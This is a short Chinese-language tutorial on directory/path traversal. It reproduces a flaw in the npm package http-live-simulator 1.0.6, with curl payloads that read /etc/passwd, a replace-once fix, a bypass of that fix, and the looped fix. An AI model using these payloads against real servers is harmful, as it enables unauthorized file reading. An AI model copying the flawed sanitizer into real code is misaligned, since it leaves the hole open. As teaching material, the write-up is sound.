### 简介

* 目录穿越 Directory traversal/ 路径穿越 Path traversal
* 漏洞原理:攻击者通过可控的输入，以"参数值"、"畸形文件"等形式，将构造的"路径"传递给后端逻辑，实现路径穿越。
* 漏洞危害:任意文件读取、写入、删除、覆盖、修改...

### 测试方法

构造payload系统相关

| |root directory|directory separator|
|:-------------:|--|-----|
|Unix-like OS|`/`|`/`|
|Windows|`<drive letter>:\`|`\` or `/`|


### 实例1

http-live-simulator@1.0.6 中开发人员没有考虑到路径穿越问题

漏洞复现
```
# 1- Install the module : 
npm install -g http-live-simulator@1.0.6
# 2- Run the server : 
http-live
# 3- Attempt to access a file from outside that project's directory
# 可实现任意文件读取.  其中curl的参数--path-as-is 表示"Do not squash .. sequences in URL path" 不压缩url路径中的..
# 注意 紧跟8080之后额外加了一个/
curl --path-as-is http://localhost:8080//../../../../etc/passwd
```

第1次修复 是将参数值中的`/../`替换为空 仅替换一次(修复无效 可被绕过)
```
pathname = pathname.replace("/../",""); //fix for path traversal bug
```

绕过方式 `/./.././`
```
curl --path-as-is http://localhost:8080/./../././../././../././.././etc/passwd
```


第2次修复 是将参数值中的`/../`替换为空 循环替换 直到不存在`/../`为止

diff: https://github.com/prahladyeri/http-live-simulator/commit/354644525f1626c5921abac10913c0d47f1f1433
```
while(pathname.indexOf("/../") != -1) {
		pathname = pathname.replace("/../",""); //fix for path traversal bug
	}
```



